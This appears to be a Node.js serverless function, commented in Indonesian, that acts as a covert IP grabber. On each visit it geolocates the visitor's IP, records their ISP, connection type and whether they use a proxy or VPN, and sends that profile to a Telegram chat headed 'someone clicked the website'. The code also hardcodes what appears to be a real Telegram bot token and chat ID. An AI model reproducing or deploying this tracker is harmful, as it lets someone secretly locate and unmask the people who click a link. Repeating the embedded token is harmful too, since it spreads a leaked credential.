const axios = require("axios");

module.exports = async (req, res) => {
  const BOT_TOKEN = "7732602866:AAHSA4X_QGm_fYhrxo-IvNsNZXeJSt5LWqg"; // Ganti dengan token bot Telegram
  const CHAT_ID = "7324869375"; // Ganti dengan ID Telegram penerima

  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  try {
    // Ambil data IP dari API
    const { data } = await axios.get(`http://ip-api.com/json/${userIP}?fields=66842623`);

    if (data.status === "fail") {
      return res.status(400).json({ error: "Gagal mendapatkan data IP." });
    }

    // Format pesan untuk dikirim ke Telegram
    const message = `
📌 *Ada yang Klik Website!*
🌍 IP: ${data.query}
🏙 Kota: ${data.city}
🌎 Negara: ${data.country} (${data.countryCode})
📡 ISP: ${data.isp}
🚀 Provider: ${data.org}
📶 Tipe Jaringan: ${data.mobile ? "Mobile" : "WiFi"}
🌐 Proxy/VPN: ${data.proxy ? "Ya" : "Tidak"}
    `;

    // Kirim ke Telegram
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });

    res.json({ success: true, message: "Data dikirim ke Telegram!" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "Terjadi kesalahan." });
  }
};